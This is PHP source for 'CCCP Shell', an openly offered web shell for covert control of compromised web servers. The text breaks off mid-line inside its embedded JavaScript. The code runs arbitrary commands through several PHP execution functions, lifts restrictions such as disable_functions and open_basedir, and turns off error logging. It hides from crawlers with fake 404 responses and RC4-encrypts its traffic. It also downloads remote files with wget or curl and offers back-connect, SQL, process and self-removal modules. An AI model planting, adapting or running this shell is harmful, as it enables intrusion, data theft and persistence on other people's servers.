<?php
/*
 * CCCP Shell
 * by DSR!
 * https://github.com/xchwarze/CCCPShell
 * v 1.0 RC4 31072014
 */

# System variables
$config['charset'] = 'utf8'; //'utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'
$config['date'] = 'd/m/Y';
$config['datetime'] = 'd/m/Y H:i:s';
$config['hd_lines'] = 16;   //lines in hex preview file
$config['hd_rows'] = 32;    //16, 24 or 32 bytes in one line
$config['FMLimit'] = 100;   //file manager item limit. false = No limit
$config['SQLLimit'] = 50;   //sql manager result limit.
$config['checkBDel'] = true;//Check Before Delete: true = On 
$config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
$config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass) //cccpshell
$config['rc4drop'] = 123;  //drop size

$CCCPmod[] = 'sql';
$CCCPtitle[] = tText('sql', 'SQL');
$CCCPmod[] = 'connect';
$CCCPtitle[] = tText('connect', 'Back Connect');
$CCCPmod[] = 'execute';
$CCCPtitle[] = tText('execute', 'Execute');
$CCCPmod[] = 'info';
$CCCPtitle[] = tText('info', 'Info');
$CCCPmod[] = 'process';
$CCCPtitle[] = tText('process', 'Process');

// ------ Start CCCPShell
$loadTime = microtime(true);
$isWIN = DIRECTORY_SEPARATOR === '\\';
define('DS', DIRECTORY_SEPARATOR);
define('SROOT', dirname(__file__) . DS);

# Restoring
ini_restore('safe_mode_include_dir');
ini_restore('safe_mode_exec_dir');
ini_restore('disable_functions');
ini_restore('allow_url_fopen');
ini_restore('safe_mode');
ini_restore('open_basedir');
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('file_uploads', 1);
@ini_set('allow_url_fopen', 1);
@ini_alter('error_log', null);
@ini_alter('log_errors', 0);
@ini_alter('file_uploads', 1);
@ini_alter('allow_url_fopen', 1);

@error_reporting(7);
@ini_set('memory_limit', '64M'); //change it if phpzip fails
@set_magic_quotes_runtime(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);

$uAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Yahoo', 'Zeus', 'bot', 'Wget');
if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $uAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))){
    header('HTTP/1.0 404 Not Found');
    exit;
}

if (in_array($config['charset'], array('utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'))) 
	header("Content-Type: text/html; charset=$config[charset]");

function mHide($n, $v){
	return "<input id='$n' name='$n' type='hidden' value='$v' />";
}

function mLink($t, $o, $e = '', $m = true){
	if ($m) $o .= ';return false;';
	return "<a href='#' onclick='$o' $e>$t</a>";
}

function mInput($n, $v, $tt = '', $nl = '', $c = '', $e = ''){
	if ($tt !== '') $tt = "$tt<br>"; 
	if ($nl !== '')
		return "<p>$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e /></p>";
	else
		return "$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e />";
}

function mSubmit($v, $o, $nl = '', $e = ''){
	if ($nl !== '')
		return "<p><input class='button' type='button' value='$v' onclick='$o;return false;' $e ></p>";
	else
		return "<input class='button' type='button' value='$v' onclick='$o;return false;' $e >";
}

function mSelect($n, $v, $nk = false, $s = false, $o = false, $t = false, $nl = false, $e = false){
	$tmp = '';
	if ($o) $o = "onchange='$o'";
	if ($t) $t = "$t<br>";
	if ($nk){
		foreach ($v as $value){
			if ($s == $value)
				$tmp .= "<option value='$value' selected='selected'>$value</option>";
			else 
				$tmp .= "<option value='$value'>$value</option>";
		}
	} else {
		foreach ($v as $key=>$value){
			if ($s == $value)
				$tmp .= "<option value='$key' selected='selected'>$value</option>";
			else 
				$tmp .= "<option value='$key'>$value</option>";
		}
	}
	$tmp = "$t<select class='theme' id='$n' name='$n' $o $e>$tmp</select>";
	if ($nl) $tmp = "<p>$tmp</p>";
	return $tmp;
}

function mCheck($n, $v, $o = '', $c = false){
	return "<input id='$n' name='$n' value='$v' type='checkbox' onclick='$o' " . ($c ? 'checked' : '') . "/>";
}

function fix_magic_quote($arr){
	$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
	$quotes_sybase = (empty($quotes_sybase) || $quotes_sybase === 'off') ? false : true;
	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
		if(is_array($arr)){
			foreach($arr as $k => $v){
				if(is_array($v)) $arr[$k] = fix_magic_quote($v);
				else $arr[$k] = ($quotes_sybase ? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v)));
			}
		} else 
			$arr = stripslashes($arr);			
	}
	return $arr;
}

function rc4Init($pwd) {
	$key = array();
	$box = array();
	$pwd_length = strlen($pwd);
	
	for ($i = 0; $i < 256; $i++) {
		$key[$i] = ord($pwd[$i % $pwd_length]);
		$box[$i] = $i;
	}
	
	for ($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $key[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}
	
	return $box;
}

function rc4($data, $box) {
	$cipher = '';
	$data_length = strlen($data);
	
	for ($a = $j = $i = 0; $i < $data_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$cipher .= chr(ord($data[$i]) ^ $box[(($box[$a] + $box[$j]) % 256)]);
	}
	
	return $cipher;
}

function rc4encrypt($data, $box) {
	global $config;
	for ($i = 1; $i <= $config['rc4drop']; $i++)
		$data = chr(mt_rand(33, 122)) . $data;
	return rc4($data, rc4Init($box));
}

function rc4decrypt($data, $box) {
	global $config;
	return substr(rc4($data, rc4Init($box)), $config['rc4drop']);
}

function getData(){
	global $config;
	$p = '';
	if (isset($_POST[$config['consNames']['post']])) $p = fix_magic_quote($_POST[$config['consNames']['post']]);
	else if (isset($_GET[$config['consNames']['post']])) $p = fix_magic_quote($_GET[$config['consNames']['post']]);
	if (!empty($p)){
		$data = array();
		$p = rc4decrypt(base64_decode($p), $config['sPass']);
		foreach(explode('&', $p) as $tmp) {
			$tmp = explode('=', $tmp);
			if (!empty($tmp[0])){
				if (strpos($tmp[0], '[]') !== false) $data[str_replace('[]', '', $tmp[0])][] = rawurldecode($tmp[1]);
				else $data[$tmp[0]] = rawurldecode($tmp[1]);
			}
		}
		$p = $data;
	}
	return $p;
}

function getSelf(){
	return $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
}

function tText($id, $def){
	
	if (isset($lang[$id])) return $lang[$id];
	else return $def;
}

function showIcon($f){
	$image = 'unk';
	$f = strtolower(substr(strrchr($f, '.'), 1));
	$img = array('htaccess', 'asp', 'cgi', 'php', 'html', 'jpg', 'js', 'swf', 'txt',
	 'tar', 'mp3', 'avi', 'cmd', 'cpp', 'ini', 'doc', 'exe', 'log', 'pl', 'py', 'xml');

    $imgEquals = array(
      'tar' => array('tar', 'r00', 'ace', 'arj', 'bz', 'bz2', 'tbz', 'tbz2', 'tgz', 'uu', 'xxe', 'zip', 'cab', 'gz', 'iso', 'lha', 'lzh', 'pbk', 'rar', 'uuf', '7z'), 
      'php' => array('php', 'php3', 'php4', 'php5', 'phtml', 'shtml'), 
      'jpg' => array('jpg', 'gif', 'png', 'jpeg', 'jfif', 'jpe', 'bmp', 'ico', 'tif', 'tiff'), 
      'html'=> array('html', 'htm'), 
      'avi' => array('avi', 'mov', 'mvi', 'mpg', 'mpeg', 'wmv', 'rm', 'mp4'), 
      'lnk' => array('lnk', 'url'), 
      'ini' => array('ini', 'css', 'inf'), 
      'doc' => array('doc', 'dot', 'wri', 'rtf', 'pdf'), 
      'js'  => array('js', 'vbs'), 
      'cmd' => array('cmd', 'bat', 'pif'), 
      'swf' => array('swf', 'fla'), 
      'mp3' => array('mp3', 'au', 'midi', 'mid'), 
      'htaccess' => array('htaccess', 'htpasswd', 'ht', 'hta', 'so') 
	);

	if (in_array($f, $img)) $image = $f;
	if ($image === 'unk'){
		foreach ($imgEquals as $k => $v){
			if (in_array($f, $v)){
				$image = $k;
				break;
			}
		}
	}

    return "<div class='image $image'></div>";
}

# General functions
function hsc($s){
	//return htmlspecialchars($s, 2|1);
	return htmlentities($s);
}

function fixRoute($s){
	return str_replace(array('/', '\\'), DS, $s);
}

function execute($c, $i = false){
    $v = '';
    $r = '';
	//$c = $c . ' 2>&1';
    $dis_func = explode(',', get_cfg_var('disable_functions'));

    if ($c){
        if (function_exists('exec') && !in_array('exec', $dis_func)){
            exec($c, $r);
            $r = implode("\n", $r);
			//$tmp = '';
			//if(!empty($r)) foreach($r as $line) $tmp .= $line;
			//$r = $tmp;
			$v = 'exec';
        } else if (function_exists('shell_exec') && !in_array('shell_exec', $dis_func)){
            $r = @shell_exec($c);
			$v = 'shell_exec';
        } else if (function_exists('system') && !in_array('system', $dis_func)){
            @ob_start();
            @system($c);
            $r = @ob_get_contents();
            @ob_end_clean();
			$v = 'system';
        } else if (function_exists('passthru') && !in_array('passthru', $dis_func)){
            @ob_start();
            @passthru($c);
            $r = @ob_get_contents();
            @ob_end_clean();
			$v = 'passthru';
        } else if (function_exists('popen') && !in_array('popen', $dis_func)){
            $h = popen($c, 'r');
            if (is_rource($h)){	
                if (function_exists('fread') && function_exists('feof')){
                    while (!feof($h))
                        $r .= fread($h, 512);
                } else if (function_exists('fgets') && function_exists('feof')){
                    while (!feof($h))
                        $r .= fgets($h, 512);
                }
            }
            pclose($h);
			$v = 'popen';
        } else if (function_exists('proc_open') && !in_array('proc_open', $dis_func)){
            $ds = array(1 => array('pipe', 'w'));
            //$ds = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
            $h = @proc_open($c, $ds, $pipes);
            //$h = @proc_open($c, $ds, $pipes, getcwd(), array());
            if (is_rource($h)){
                if (function_exists('fread') && function_exists('feof')){
                    while (!feof($pipes[1]))
                        $r .= fread($pipes[1], 512);
                } else if (function_exists('fgets') && function_exists('feof')){
                    while (!feof($pipes[1]))
                        $r .= fgets($pipes[1], 512);
					/*while (!feof($pipes[2]))
                        $r .= fgets($pipes[2], 512);*/
                }
            }
            @proc_close($h);
			$v = 'proc_open';
        }
    }

	if ($i) $r = array(0 => $r, 1 => $v);
    return($r);
}

function safeStatus(){
    $safe_mode = @ini_get('safe_mode');
    if (!$safe_mode && strpos(execute('echo abcdef'), 'def') != 3) $safe_mode = true;
    return $safe_mode;
}

function getfun($n){
    return (false !== function_exists($n)) ? tText('yes', 'yes') : tText('no', 'no');
}

function getcfg($n){
    $result = get_cfg_var($n);
    if ($result == 0) return tText('no', 'no');
    else if ($result == 1) return tText('yes', 'yes');
    else return $result;
}

function read_file($file){
	$content = false;
	if($fh = @fopen($file, 'rb')){
		$content = '';
		while(!feof($fh))
			$content .= fread($fh, 8192);
	}
	return $content;
}

function sizecount($s){
	if ($s[0] === '*') return $s;
	$sizename = array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
	return @round( $s / pow(1024, ($i = floor(log($s, 1024)))), 2) . $sizename[$i];
}

function getPath($s, $n){
    if ($n === '.') $n = $s;
    if (substr($n, -1) !== DS) $n = $n . DS;
    return $n;
}

function getUpPath($n){
    $pathdb = explode(DS, $n);
    $num = count($pathdb);
    if ($num > 2) unset($pathdb[$num - 1], $pathdb[$num - 2]);
    $uppath = implode(DS, $pathdb) . DS;
    return $uppath;
}

function sAjax($i){
	global $config;
	exit(base64_encode(rc4encrypt($i, $config['sPass'])));
}

function sDialog($i){
    return "<br><div id='uires' class='uires'>$i</div><br>";
}

function sValid($v){
    if ((isset($v)) && ($v !== '')) return true;
    else return false;
}

function zip($files, $archive){
	if(!extension_loaded('zip')) return false;
	$zip = new ZipArchive();
	if(!$zip->open($archive, 1)) return false;

	if(!is_array($files)) $files = array($files);
	foreach($files as $file){
		$file = str_replace(get_cwd(), '', $file);
		$file = str_replace('\\', '/', $file);
		if(is_dir($file)){
			$filesIterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($file), 1);
			foreach($filesIterator as $iterator){
				$iterator = str_replace('\\', '/', $iterator);
				if(in_array(substr($iterator, strrpos($iterator, '/')+1), array('.', '..'))) continue;
				if(is_dir($iterator)) $zip->addEmptyDir(str_replace($file.'/', '', $iterator.'/'));
				else if(is_file($iterator)) $zip->addFromString(str_replace($file.'/', '', $iterator), read_file($iterator));
			}
		} else if(is_file($file)) 
			$zip->addFromString(basename($file), read_file($file));
	}
	if($zip->getStatusString()!==false) return true;
	$zip->close();
}

//TODO: agregar posibilidad de ir dumpeando mientras se hace en lugar de en memoria
//para poder usarlo con archivos enormes/poca memoria
# Based on PHPZip v1.2 by DSR!
class PHPZip {
    var $datasec = array();
    var $ctrl_dir = array();
    var $old_offset = 0;

    function Zipper($basedir, $filelist){
		$cdir = dirname($basedir . $filelist[0]) . DS;
		$cut = strlen($cdir);
		foreach ($filelist as $f){	
			$f = $basedir . $f;
			if (file_exists($f)){
				if (is_dir($f)) $sBuff = $this->GetFileList($f, $cut);
				else if (is_file($f)){
					$fd = fopen($f, 'r');
					$sBuff = @fread($fd, filesize($f));
					fclose($fd);
					$this->addFile($sBuff, substr($f, $cut));
				}
			}
        }
        $out = $this->file();
		
        return 1;
    }

    function GetFileList($dir, $cut){
        if (file_exists($dir)){			
            $h = opendir($dir);
            while ($f = readdir($h)){
                if (($f !== '.') && ($f !== '..')){
                    if (is_dir($dir . $f)) $this->GetFileList($dir . $f . DS, $cut);
                    else if (is_file($dir . $f)){
						$fd = fopen($dir . $f, 'r');
						$sBuff = @fread($fd, filesize($dir . $f));
						fclose($fd);
						$this->addFile($sBuff, substr($dir . $f, $cut));
                    }
                }
            }
            closedir($h);
        }
        return 1;
    }

    function unix2DosTime($t = 0){
        $ta = ($t == 0) ? getdate() : getdate($t);
        if ($ta['year'] < 1980) $ta = array('year' => 1980, 'mon' => 1, 'mday' => 1, 'hours' => 0, 'minutes' => 0, 'seconds' => 0);
        return (($ta['year'] - 1980) << 25) | ($ta['mon'] << 21) | ($ta['mday'] << 16) | ($ta['hours'] << 11) | ($ta['minutes'] << 5) | ($ta['seconds'] >> 1);
    }
	
	function hex2bin($s){
		$bin = '';
		$i = 0;
		do {
			$bin .= chr(hexdec($s{$i}.$s{($i + 1)}));
			$i += 2;
		} while ($i < strlen($s));
		return $bin;
	}

    function addFile($data, $name, $time = 0){
		$packv0 = pack('v', 0);
        $dtime = dechex($this->unix2DosTime($time));
		$hexdtime = $this->hex2bin($dtime[6] . $dtime[7] . $dtime[4] . $dtime[5] . $dtime[2] . $dtime[3] . $dtime[0] . $dtime[1]);
        $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00" . $hexdtime;

        // "local file header" segment
        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $c_len = strlen($zdata);
        $fr .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len) . pack('v', strlen($name)) . $packv0 . $name;

        // "file data" segment
        $fr .= $zdata;

        // "data descriptor" segment
        $fr .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len);

        // add this entry to array
        $this->datasec[] = $fr;

        // now add to central directory record
        $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00" . $hexdtime;
        $cdrec .= pack('V', $crc) . pack('V', $c_len) . pack('V', $unc_len) . pack('v', strlen($name)) . $packv0 . $packv0 . $packv0 . $packv0 . pack('V', 32);
        $cdrec .= pack('V', $this->old_offset);
        $this->old_offset += strlen($fr);
        $cdrec .= $name;

        // save to central directory
        $this->ctrl_dir[] = $cdrec;
    }

    function file(){
        $data = implode('', $this->datasec);
        $ctrldir = implode('', $this->ctrl_dir);
        return $data . $ctrldir . "\x50\x4b\x05\x06\x00\x00\x00\x00" . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "  ";
    }

    function output($file){
        $fp = fopen($file, 'w');
        fwrite($fp, $this->file());
        fclose($fp);
    }
}

function compress($type, $archive, $files){
	if(!is_array($files)) $files = array($files);
	if($type=='zip'){
		if(class_exists('ZipArchive'))
			if (zip($files, $archive)) return true;
		else {
			//TODO
		}
	} else if (($type=='tar')||($type=='targz')){
		$archive = basename($archive);
		$listsBasename = array_map('basename', $files);
		$lists = array_map('wrap_with_quotes', $listsBasename);

		if ($type=='tar') 
			execute('tar cf "'.$archive.'" '.implode(' ', $lists));
		else if ($type=='targz') 
			execute('tar czf "'.$archive.'" '.implode(' ', $lists));

		if (is_file($archive)) 
			return true;
	}
	return false;
}

function decompress($type, $archive, $path){
	$path = realpath($path).DIRECTORY_SEPARATOR;
	if(is_dir($path)){
		chdir($path);
		if($type=='unzip'){
			if(class_exists('ZipArchive')){
				$zip = new ZipArchive();
				$target = $path.basename($archive,'.zip');
				if($zip->open($archive)){
					if(!is_dir($target)) mkdir($target);
					if($zip->extractTo($target)) return true;
					$zip->close();
				}
			} else {
				//TODO
			}
		} else if($type=='untar'){
			$target = basename($archive,'.tar');
			if(!is_dir($target)) mkdir($target);
			$before = count(get_all_files($target));
			execute('tar xf "'.basename($archive).'" -C "'.$target.'"');
			$after = count(get_all_files($target));
			if($before!=$after) return true;
		} else if($type=='untargz'){
			$target = '';
			if(strpos(strtolower($archive), '.tar.gz')!==false) $target = basename($archive,'.tar.gz');
			else if(strpos(strtolower($archive), '.tgz')!==false) $target = basename($archive,'.tgz');
			if(!is_dir($target)) mkdir($target);
			$before = count(get_all_files($target));
			execute('tar xzf "'.basename($archive).'" -C "'.$target.'"');
			$after = count(get_all_files($target));
			if($before!=$after) return true;
		}
	}
	return false;
}

function download($url ,$save){
	if(!preg_match("/[a-z]+:\/\/.+/",$url)) return false;
	$filename = basename($url);

	if($sBuff = read_file($url)){
		if(is_file($save)) unlink($save);
		if(write_file($save, $sBuff))
			return true;
	}
	
	if (!$isWIN){
		$buff = execute('wget '.$url.' -O '.$save);
		if(is_file($save)) return true;
		$buff = execute('curl '.$url.' -o '.$save);
		if(is_file($save)) return true;
		$buff = execute('lwp-download '.$url.' '.$save);
		if(is_file($save)) return true;
		$buff = execute('lynx -source '.$url.' > '.$save);
		if(is_file($save)) return true;
	}

	return false;
}

function filesize64($file){
	$size = filesize($file);
	if ($size > 1610612736 or $size < -1){
		/*
		global $isWIN;
		$size = 0;
		if (!safeStatus()){
			$cmd = ($isWIN) ? "for %F in (\"$file\") do @echo %~zF" : "stat -c%s \"$file\"";
			execute($cmd, $output);
			ctype_digit($size = trim($output));
		}
	
		if ($isWIN && class_exists("COM")){
			try {
				$fsobj = new COM('Scripting.FileSystemObject');
				$f = $fsobj->GetFile(realpath($file));
				$size = $f->Size;
			} catch (Exception $e){}
		}
		
		$piece = 1073741824;
		$fp = @fopen($file, 'r');
		@fseek($fp, 0, SEEK_SET);
		while ($piece > 1){
			@fseek($fp, $piece, SEEK_CUR);
			if (@fgetc($fp) === false){
				@fseek($fp, -$piece, SEEK_CUR);
				$piece = (int)($piece / 2);
			} else {
				@fseek($fp, -1, SEEK_CUR);
				$size += $piece;
			}
		}

		while (@fgetc($fp) !== false)
			$size++;
			
		@fclose($file_pointer);
		*/
		$size = sprintf("%u", $size);
		$sizename = array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
		$size = '* ' . @round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
	}
	
	return $size;
}

function genPaginator($c, $t = -1, $fm = true) {
	global $p;
	
	$l = 'dbexec("' . (isset($p['code']) ? $p['code'] : '') . '&pg=';
	if ($fm)
		$l = 'ajaxLoad("me=file&dir=" + euc(d.getElementById("base").value) + "&pg=';
	
	if ($t < 0)
		$t = $c + 1;
	
	$tmp = '<div class="paginator">';
	$i = 0;
	while($i < $t) {
		$i++;
		if ($i < $c)
			$tmp .= mLink($i, $l . $i . '")', 'class="prev"');
		else if ($i == $c)
			$tmp .= '<span class="current">' . $i . '</span>';
		else
			$tmp .= mLink($i . ($fm ? ' ...?' : ''), $l . $i . '")', 'class="next"');
	}

	return $tmp . '</div>';
}


$sBuff = '';  	
$p = getData();


# Sections
if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
	$i = 0;
	$countMenu = count($CCCPmod);
	$sysMenu = mLink('<b>' . tText('fm', 'File Manager') . '</b>', 'ajaxLoad("me=file")') . ' | ';
	while ($i < $countMenu){
		$sysMenu .= mLink("<b>$CCCPtitle[$i]</b>", 'ajaxLoad("me=' . $CCCPmod[$i] . '")') . ($i == $countMenu ? '' : ' | ');
		$i++;
	}			 
	$sysMenu .= mLink('<b>' . tText('srm', 'Self Remove') . '</b>', 'ajaxLoad("me=srm")') . ' | ' . mLink('<b>' . tText('logout', 'Logout') . '</b>', 'if (confirm("' . tText('merror', 'Are you sure?') . '")) {sessionStorage.clear();hash="";d.getElementsByTagName("html")[0].innerHTML="";}');
	
	$loader = '
	<!DOCTYPE html>
	<html>
	<head>
	  <meta http-equiv=Content-Type content="text/html; charset=iso-8859-1">
	  <meta http-equiv=Pragma content=no-cache>
	  <meta http-equiv=Expires content="wed, 26 Feb 1997 08:21:57 GMT">
	  <meta name="robots" content="noindex, nofollow, noarchive" />
	  <link rel="shortcut icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAD+AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD+AAAA+AIGAv8IHAn/CSIL/wkiC/8JIgv/CSIL/wkiC/8JIgv/CSIL/wkiC/8JIgv/CSIL/wkhC/8FEQb/AAEA9wABAPsHGgj/IHUm/yeOLv8njS7/J40u/yeOLv8nji7/J40u/yaMLf8njS7/J44u/yeNLv8miy3/FEYX/wEDAfsAAQD7CB4K/yWGK/8sojX/LKE0/y2iNf8rnDL/I4Iq/x1nIv8aXh7/HWki/yWEKv8rnTP/LJ80/xZQGv8BAwH7AAEA+wgeCv8lhSv/LKE1/yyhNP8okS//FlAa/wccCf8DCgP/AQUC/wMLA/8IHgn/F1Uc/yiRMP8WUBr/AQMB+wABAPsIHgr/JYUr/yyhNf8pljH/FEkX/wMLA/8AAAb/AAAV/wAAC/8AAAD/AAAA/wQQBf8bYyD/FlAa/wEDAfsAAQD7CB4K/yWFK/8sojT/HWki/wQQBf8AAAb/AABS/wAAnv8AAGT/AAAN/wAAAP8DDAT/Gl4e/xZQGv8BAwH7AAEA+wgeCv8lhiz/KZcx/w84Ev8BAgH/AAAk/wAAu/8AAOL/AAB2/wAADf8DCQP/E0UW/yeOLv8WUBr/AQMB+wABAPsIHgr/JYcs/ySFK/8IHgr/AAAA/wAALf8AAI3/AABe/wABFP8FEAb/FUwY/yiSL/8rnjP/FlAa/wEDAfsAAQD7CB4K/yWGK/8fdCX/BA8E/wAAAP8AAAf/AAAQ/wEFBv8JIgv/G2Qh/yqXMf8soTT/K50z/xZQGv8BAwH7AAEA+wgeCv8lhSv/HGci/wIIA/8AAQD/AgYC/wcZCf8USRj/I4Iq/yueM/8soTT/LKA0/yudM/8WUBr/AQMB+wABAPsIHgr/JYQr/xxnIf8GGAj/CycN/xVLGP8ieyj/Kpoy/yygNP8soDT/LKA0/yygNP8rnTP/FlAa/wEDAfsAAQD7CB4K/yWFK/8miy7/IHcm/yeNLf8snTP/LaI1/yyhNP8soDT/LKA0/yygNP8soDT/K50z/xZQGv8BAwH7AAEA+wYZCP8ebSP/JIQr/ySEK/8khCv/JIQr/ySDK/8kgyv/JIMr/ySDK/8kgyv/JIMr/yOBKv8SQhX/AQMB+wABAPsBBAH/BRIG/wYWB/8GFgf/BhYH/wYWB/8GFgf/BhYH/wYWB/8GFgf/BhYH/wYWB/8GFQf/AwsE/wABAPsAAAD+AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD/AAAA/wAAAP8AAAD+AAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAAAAJgAAACYAAAAmAA==" />
	  <title>CCCP Modular Shell</title>  
	  <script type="text/javascript">
	var h = 0;
	var j = 1;
	var d = document;
	var euc = encodeURIComponent;
	var onDrag = false;
	var dragX, dragY, dragDeltaX, dragDeltaY, lastAjax , lastLoad = "";
	var targeturl = "' . getSelf() . '";
	var copyBuffer = []; 
	
	sorttable={k:function(a){sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,0==a.getElementsByTagName("thead").length&&(the=d.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);
	if(1==a.tHead.rows.length){sortbottomrows=[];for(b=0;b<a.rows.length;b++)-1!=a.rows[b].className.search(/\bsortbottom\b/)&&(sortbottomrows[sortbottomrows.length]=a.rows[b]);if(sortbottomrows){null==a.tFoot&&(tfo=d.createElement("tfoot"),a.appendChild(tfo));for(b=0;b<sortbottomrows.length;b++)tfo.appendChild(sortbottomrows[b]);delete sortbottomrows}headrow=a.tHead.rows[0].cells;for(b=0;b<headrow.length;b++)if(!headrow[b].className.match(/\bsorttable_nosort\b/)){(mtch=headrow[b].className.match(/\bsorttable_([a-z0-9]+)\b/))&&
	(override=mtch[1]);headrow[b].p=mtch&&"function"==typeof sorttable["sort_"+override]?sorttable["sort_"+override]:sorttable.j(a,b);headrow[b].o=b;headrow[b].c=a.tBodies[0];c=headrow[b],e=sorttable.q=function(){if(-1!=this.className.search(/\bsorttable_sorted\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted","sorttable_sorted_reverse"),this.removeChild(d.getElementById("sorttable_sortfwdind")),sortrevind=d.createElement("span"),sortrevind.id="sorttable_sortrevind",
	sortrevind.innerHTML="&nbsp;&#x25B4;",this.appendChild(sortrevind);else if(-1!=this.className.search(/\bsorttable_sorted_reverse\b/))sorttable.reverse(this.c),this.className=this.className.replace("sorttable_sorted_reverse","sorttable_sorted"),this.removeChild(d.getElementById("sorttable_sortrevind")),sortfwdind=d.createElement("span"),sortfwdind.id="sorttable_sortfwdind",sortfwdind.innerHTML="&nbsp;&#x25BE;",this.appendChild(sortfwdind);else{theadrow=this.parentNode;l(theadrow.childNodes,
	function(a){1==a.nodeType&&(a.className=a.className.replace("sorttable_sorted_reverse",""),a.className=a.className.replace("sorttable_sorted",""))});(sortfwdind=d.getElementById("sorttable_sortfwdind"))&&sortfwdind.parentNode.removeChild(sortfwdind);(sortrevind=d.getElementById("sorttable_sortrevind"))&&sortrevind.parentNode.removeChild(sortrevind);this.className+=" sorttable_sorted";sortfwdind=d.createElement("span");sortfwdind.id="sorttable_sortfwdind";sortfwdind.innerHTML=
	"&nbsp;&#x25BE;";this.appendChild(sortfwdind);row_array=[];col=this.o;rows=this.c.rows;for(a=0;a<rows.length;a++)row_array[row_array.length]=[sorttable.d(rows[a].cells[col]),rows[a]];row_array.sort(this.p);tb=this.c;for(a=0;a<row_array.length;a++)tb.appendChild(row_array[a][1]);delete row_array}};if(c.addEventListener)c.addEventListener("click",e,j);else{e.f||(e.f=n++);c.b||(c.b={});g=c.b.click;g||(g=c.b.click={},c.onclick&&(g[0]=c.onclick));g[e.f]=e;c.onclick=p}}}},j:function(a,b){sortfn=
	sorttable.l;for(c=0;c<a.tBodies[0].rows.length;c++)if(text=sorttable.d(a.tBodies[0].rows[c].cells[b]),""!=text){if(text.match(/^-?[\u00a3$\u00a4]?[\d,.]+%?$/))return sorttable.n;if(possdate=text.match(sorttable.a)){first=parseInt(possdate[1]);second=parseInt(possdate[2]);if(12<first)return sorttable.g;if(12<second)return sorttable.m;sortfn=sorttable.g}}return sortfn},d:function(a){if(!a)return"";hasInputs="function"==typeof a.getElementsByTagName&&a.getElementsByTagName("input").length;if(""!=
	a.title)return a.title;if("undefined"!=typeof a.textContent&&!hasInputs)return a.textContent.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.innerText&&!hasInputs)return a.innerText.replace(/^\s+|\s+$/g,"");if("undefined"!=typeof a.text&&!hasInputs)return a.text.replace(/^\s+|\s+$/g,"");switch(a.nodeType){case 3:if("input"==a.nodeName.toLowerCase())return a.value.replace(/^\s+|\s+$/g,"");case 4:return a.nodeValue.replace(/^\s+|\s+$/g,"");case 1:case 11:for(b="",c=0;c<a.childNodes.length;c++)b+=
	sorttable.d(a.childNodes[c]);return b.replace(/^\s+|\s+$/g,"");default:return""}},reverse:function(a){newrows=[];for(b=0;b<a.rows.length;b++)newrows[newrows.length]=a.rows[b];for(b=newrows.length-1;0<=b;b--)a.appendChild(newrows[b]);delete newrows},n:function(a,b){aa=parseFloat(a[0].replace(/[^0-9.-]/g,""));isNaN(aa)&&(aa=0);bb=parseFloat(b[0].replace(/[^0-9.-]/g,""));isNaN(bb)&&(bb=0);return aa-bb},l:function(a,b){return a[0].toLowerCase()==b[0].toLowerCase()?0:a[0].toLowerCase()<b[0].toLowerCase()?
